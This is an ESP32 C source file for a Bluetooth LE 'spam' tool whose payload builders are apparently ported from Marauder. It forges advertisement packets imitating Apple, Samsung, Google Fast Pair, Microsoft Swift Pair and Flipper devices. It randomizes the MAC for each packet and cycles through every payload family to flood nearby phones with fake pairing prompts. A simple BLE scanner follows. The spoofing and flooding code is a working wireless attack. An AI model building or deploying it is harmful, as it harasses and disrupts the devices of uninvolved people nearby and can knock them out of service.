// new version
#include "ble_spam.h"
#include "esp_log.h"
#include "esp_random.h"
#include "freertos/FreeRTOS.h"
#include "freertos/semphr.h"
#include "freertos/task.h"
#include "host/ble_hs.h"
#include "host/ble_hs_id.h"
#include "nimble/nimble_port.h"
#include "nimble/nimble_port_freertos.h"
#include "services/gap/ble_svc_gap.h"
#include <string.h>

static const char *TAG = "BLE_SPAM";

static volatile bool adv_active = false;

/* ------------------------------------------------------------------ */
/*  Helpers                                                           */
/* ------------------------------------------------------------------ */

static int gap_event(struct ble_gap_event *event, void *arg) {
    if (event->type == BLE_GAP_EVENT_ADV_COMPLETE) {
        adv_active = false;
    }
    return 0;
}

static void set_random_mac(void) {
    uint8_t mac[6];
    esp_fill_random(mac, 6);
    mac[0] |= 0xC0; /* static random address */
    mac[0] &= 0xCF;
    ble_hs_id_set_rnd(mac);
}

static void start_raw_adv(const uint8_t *data, uint8_t len) {
    int rc = ble_gap_adv_set_data(data, len);
    if (rc != 0) {
        ESP_LOGE(TAG, "set_data failed: %d", rc);
        return;
    }

    struct ble_gap_adv_params params = {0};
    params.conn_mode = BLE_GAP_CONN_MODE_NON;
    params.disc_mode = BLE_GAP_DISC_MODE_GEN;
    params.itvl_min = 0x0020;
    params.itvl_max = 0x0030;

    rc = ble_gap_adv_start(BLE_OWN_ADDR_RANDOM, NULL, BLE_HS_FOREVER, &params,
                           gap_event, NULL);
    if (rc == 0) {
        adv_active = true;
    } else {
        ESP_LOGE(TAG, "adv_start failed: %d", rc);
    }
}

/* ------------------------------------------------------------------ */
/*  Payload builders (ported from Marauder)                           */
/* ------------------------------------------------------------------ */

static int build_apple_action(uint8_t *buf, uint8_t max_len) {
    const uint8_t types[] = {0x27, 0x09, 0x02, 0x1e, 0x2b,
                             0x2f, 0x01, 0x06, 0x20};
    uint8_t t = types[esp_random() % sizeof(types)];

    uint8_t p[] = {0x02,
                   0x01,
                   0x06, /* Flags */
                   0x0A,
                   0xFF,
                   0x4C,
                   0x00, /* Apple OUI */
                   0x0F,
                   0x05,
                   0xC0,
                   t, /* Action header + type */
                   (uint8_t)(esp_random() & 0xFF),
                   (uint8_t)(esp_random() & 0xFF),
                   (uint8_t)(esp_random() & 0xFF)};
    if (sizeof(p) > max_len)
        return 0;
    memcpy(buf, p, sizeof(p));
    return sizeof(p);
}

static int build_apple_device(uint8_t *buf, uint8_t max_len) {
    const uint16_t types[] = {0x0220, 0x0F20, 0x1320, 0x1420, 0x0E20,
                              0x0A20, 0x0055, 0x0C20, 0x1120, 0x0520,
                              0x1020, 0x0920, 0x1720, 0x1220, 0x1620};
    uint16_t type = types[esp_random() % (sizeof(types) / sizeof(types[0]))];

    uint8_t p[] = {0x02,
                   0x01,
                   0x06, /* Flags */
                   0x14,
                   0xFF,
                   0x4C,
                   0x00, /* Apple OUI */
                   0x07,
                   0x0F,
                   0x00,
                   (uint8_t)((type >> 8) & 0xFF),
                   (uint8_t)((type >> 0) & 0xFF),
                   0xAC,
                   0x90,
                   0x85,
                   0x75,
                   0x94,
                   0x65, /* fixed bytes */
                   (uint8_t)(esp_random() & 0xFF),
                   (uint8_t)(esp_random() & 0xFF),
                   (uint8_t)(esp_random() & 0xFF),
                   (uint8_t)(esp_random() & 0xFF),
                   (uint8_t)(esp_random() & 0xFF),
                   0x00};
    if (sizeof(p) > max_len)
        return 0;
    memcpy(buf, p, sizeof(p));
    return sizeof(p);
}

static int build_samsung(uint8_t *buf, uint8_t max_len) {
    uint8_t model = 0x02 + (esp_random() % 0x1F); /* watch-ish range */

    uint8_t p[] = {0x02, 0x01, 0x06,       /* Flags */
                   0x0E, 0xFF, 0x75, 0x00, /* Samsung OUI */
                   0x01, 0x00, 0x02, 0x00, 0x01, 0x01,
                   0xFF, 0x00, 0x00, 0x43, model};
    if (sizeof(p) > max_len)
        return 0;
    memcpy(buf, p, sizeof(p));
    return sizeof(p);
}

static int build_google(uint8_t *buf, uint8_t max_len) {
    int8_t tx = (int8_t)((esp_random() % 120) - 100);

    uint8_t p[] = {
        0x02, 0x01, 0x06,                         /* Flags */
        0x03, 0x03, 0x2C, 0xFE,                   /* Fast Pair UUID16 */
        0x06, 0x16, 0x2C, 0xFE,                   /* Service Data */
        0x00, 0xB7, 0x27, 0x02, 0x0A, (uint8_t)tx /* TX Power */
    };
    if (sizeof(p) > max_len)
        return 0;
    memcpy(buf, p, sizeof(p));
    return sizeof(p);
}

static int build_microsoft(uint8_t *buf, uint8_t max_len) {
    const char *alphabet = "abcdefghijklmnopqrstuvwxyz";
    char name[6];
    for (int i = 0; i < 5; i++) {
        name[i] = alphabet[esp_random() % 26];
    }
    name[5] = '\0';
    uint8_t name_len = 5;

    uint8_t p[32];
    int i = 0;
    p[i++] = 0x02;
    p[i++] = 0x01;
    p[i++] = 0x06; /* Flags */

    p[i++] = 6 + name_len; /* AD length */
    p[i++] = 0xFF;         /* Manufacturer Specific */
    p[i++] = 0x06;
    p[i++] = 0x00;
    p[i++] = 0x03;
    p[i++] = 0x00;
    p[i++] = 0x80;
    memcpy(&p[i], name, name_len);
    i += name_len;

    if (i > max_len)
        return 0;
    memcpy(buf, p, i);
    return i;
}

static int build_flipper(uint8_t *buf, uint8_t max_len) {
    const char *alphabet = "abcdefghijklmnopqrstuvwxyz";
    char name[6];
    for (int i = 0; i < 5; i++) {
        name[i] = alphabet[esp_random() % 26];
    }
    name[5] = '\0';

    uint8_t p[64];
    int i = 0;

    p[i++] = 0x02;
    p[i++] = 0x01;
    p[i++] = 0x06; /* Flags */
    p[i++] = 0x06;
    p[i++] = 0x09; /* Complete name */
    memcpy(&p[i], name, 5);
    i += 5;

    p[i++] = 0x03;
    p[i++] = 0x02; /* UUID16 */
    p[i++] = 0x80 + 1 + (esp_random() % 3);
    p[i++] = 0x30;

    p[i++] = 0x02;
    p[i++] = 0x0A;
    p[i++] = 0x00; /* TX Power */

    p[i++] = 0x08;
    p[i++] = 0xFF; /* Manufacturer */
    p[i++] = 0xBA;
    p[i++] = 0x0F; /* Flipper OUI */
    p[i++] = 0x4C;
    p[i++] = 0x75;
    p[i++] = 0x67;
    p[i++] = 0x26;
    p[i++] = 0xE1;
    p[i++] = 0x80;

    if (i > max_len)
        return 0;
    memcpy(buf, p, i);
    return i;
}

/* ------------------------------------------------------------------ */
/*  Public API                                                        */
/* ------------------------------------------------------------------ */

static void ble_host_task(void *param) {
    nimble_port_run();
    nimble_port_freertos_deinit();
}

void ble_spam_init(void) {
    ESP_ERROR_CHECK(nimble_port_init());
    nimble_port_freertos_init(ble_host_task);
}

/* Legacy name-spammer (kept for compatibility) */
static const char *spam_names[] = {"AirPods Pro",   "AirPods Max",
                                   "Samsung Buds2", "Google Pixel Buds",
                                   "Microsoft",     NULL};

void ble_spam_run_once(void) {
    static int idx = 0;
    const char *name = spam_names[idx];
    if (!name) {
        idx = 0;
        name = spam_names[0];
    }

    struct ble_hs_adv_fields fields = {0};
    fields.name = (const uint8_t *)name;
    fields.name_len = strlen(name);
    fields.name_is_complete = 1;
    fields.flags = BLE_HS_ADV_F_DISC_GEN | BLE_HS_ADV_F_BREDR_UNSUP;

    if (adv_active) {
        ble_gap_adv_stop();
        adv_active = false;
        vTaskDelay(pdMS_TO_TICKS(20));
    }

    int rc = ble_gap_adv_set_fields(&fields);
    if (rc != 0) {
        ESP_LOGE(TAG, "set_fields failed: %d", rc);
        return;
    }

    struct ble_gap_adv_params params = {0};
    params.conn_mode = BLE_GAP_CONN_MODE_NON;
    params.disc_mode = BLE_GAP_DISC_MODE_GEN;
    params.itvl_min = 0x0020;
    params.itvl_max = 0x0040;

    rc = ble_gap_adv_start(BLE_OWN_ADDR_PUBLIC, NULL, BLE_HS_FOREVER, &params,
                           gap_event, NULL);
    if (rc == 0)
        adv_active = true;
    else
        ESP_LOGE(TAG, "adv_start failed: %d", rc);

    idx++;
}

/* ------------------------------------------------------------------ */
/*  Kitchen Sink — cycles through every payload family                */
/* ------------------------------------------------------------------ */

typedef int (*payload_builder_t)(uint8_t *, uint8_t);

static const payload_builder_t builders[] = {
    build_apple_action, build_apple_device, build_samsung,
    build_google,       build_microsoft,    build_flipper,
};

void ble_spam_kitchen_sink_run_once(void) {
    static uint8_t idx = 0;
    uint8_t adv_data[64];
    int len;

    if (adv_active) {
        ble_gap_adv_stop();
        adv_active = false;
        vTaskDelay(pdMS_TO_TICKS(20));
    }

    set_random_mac();

    len = builders[idx](adv_data, sizeof(adv_data));
    if (len > 0) {
        ESP_LOGI(TAG, "Kitchen sink payload %u, len=%d", idx, len);
        start_raw_adv(adv_data, len);
    }

    idx = (idx + 1) % (sizeof(builders) / sizeof(builders[0]));
}

void ble_spam_stop(void) {
    if (adv_active) {
        ble_gap_adv_stop();
        adv_active = false;
    }
}

/* ------------------------------------------------------------------ */
/*  BLE scanner                                                       */
/* ------------------------------------------------------------------ */

static SemaphoreHandle_t s_scan_mux = NULL;
static volatile bool s_scan_loop = false;

typedef struct {
    uint8_t mac[6];
    char name[BLE_SCAN_NAME_LEN];
    int8_t rssi;
    bool seen;
} ble_dev_t;

static ble_dev_t s_devs[BLE_SCAN_MAX_DEVICES];
static uint32_t s_dev_count = 0;

static void parse_adv_name(const uint8_t *data, uint8_t len, char *out,
                           uint8_t cap) {
    uint8_t pos = 0;
    out[0] = '\0';
    while (pos + 2 <= len) {
        uint8_t alen = data[pos];
        if (alen == 0) {
            break;
        }
        uint8_t atype = data[pos + 1];
        uint8_t dlen = alen - 1;
        uint8_t start = pos + 2;
        if (start + dlen > len) {
            break;
        }
        if ((atype == 0x08 || atype == 0x09) && dlen > 0) {
            uint8_t n = dlen < cap - 1 ? dlen : cap - 1;
            memcpy(out, &data[start], n);
            out[n] = '\0';
            return;
        }
        pos = start + dlen;
    }
}

static struct ble_gap_disc_params scan_params(void) {
    struct ble_gap_disc_params p = {0};
    p.itvl = 0x0050;
    p.window = 0x0050;
    p.filter_duplicates = 1;
    return p;
}

static int scan_gap_event(struct ble_gap_event *event, void *arg) {
    (void)arg;
    switch (event->type) {
    case BLE_GAP_EVENT_DISC: {
        const ble_addr_t *addr = &event->disc.addr;
        if (xSemaphoreTake(s_scan_mux, 0) != pdTRUE) {
            return 0;
        }
        uint32_t i;
        for (i = 0; i < s_dev_count; i++) {
            if (memcmp(s_devs[i].mac, addr->val, 6) == 0) {
                break;
            }
        }
        if (i >= s_dev_count && i < BLE_SCAN_MAX_DEVICES) {
            s_dev_count++;
            memcpy(s_devs[i].mac, addr->val, 6);
            s_devs[i].seen = 1;
            s_devs[i].rssi = -128;
            s_devs[i].name[0] = '\0';
        }
        s_devs[i].rssi = event->disc.rssi;
        if (event->disc.length_data > 0) {
            parse_adv_name(event->disc.data, event->disc.length_data,
                           s_devs[i].name, BLE_SCAN_NAME_LEN);
        }
        xSemaphoreGive(s_scan_mux);
        return 0;
    }
    case BLE_GAP_EVENT_DISC_COMPLETE:
        if (s_scan_loop) {
            /* keep scanning until told to stop */
            struct ble_gap_disc_params p = scan_params();
            ble_gap_disc(BLE_OWN_ADDR_PUBLIC, 5000, &p, scan_gap_event, NULL);
        }
        return 0;
    default:
        return 0;
    }
}

void ble_scan_start(void) {
    if (s_scan_mux == NULL) {
        s_scan_mux = xSemaphoreCreateMutex();
    }
    ble_spam_stop(); /* advertising and discovery can't run together */
    s_scan_loop = true;
    s_dev_count = 0;
    memset(s_devs, 0, sizeof(s_devs));
    ESP_LOGI(TAG, "BLE scan starting");
    struct ble_gap_disc_params p = scan_params();
    int rc = ble_gap_disc(BLE_OWN_ADDR_PUBLIC, 5000, &p, scan_gap_event, NULL);
    if (rc != 0) {
        ESP_LOGE(TAG, "ble_gap_disc failed: %d", rc);
        s_scan_loop = false;
    }
}

void ble_scan_stop(void) {
    s_scan_loop = false;
    ble_gap_disc_cancel();
}

bool ble_scan_running(void) { return s_scan_loop; }

void ble_scan_reset(void) {
    if (!s_scan_mux) {
        return;
    }
    xSemaphoreTake(s_scan_mux, portMAX_DELAY);
    s_dev_count = 0;
    memset(s_devs, 0, sizeof(s_devs));
    xSemaphoreGive(s_scan_mux);
}

uint32_t ble_scan_count(void) {
    uint32_t c = 0;
    if (s_scan_mux) {
        xSemaphoreTake(s_scan_mux, portMAX_DELAY);
        c = s_dev_count;
        xSemaphoreGive(s_scan_mux);
    }
    return c;
}

void ble_scan_get(uint32_t i, uint8_t mac[6], char name[BLE_SCAN_NAME_LEN],
                  int8_t *rssi) {
    if (!s_scan_mux) {
        return;
    }
    xSemaphoreTake(s_scan_mux, portMAX_DELAY);
    if (i < s_dev_count) {
        memcpy(mac, s_devs[i].mac, 6);
        snprintf(name, BLE_SCAN_NAME_LEN, "%s",
                 s_devs[i].name[0] ? s_devs[i].name : "(no name)");
        if (rssi) {
            *rssi = s_devs[i].rssi;
        }
    }
    xSemaphoreGive(s_scan_mux);
}
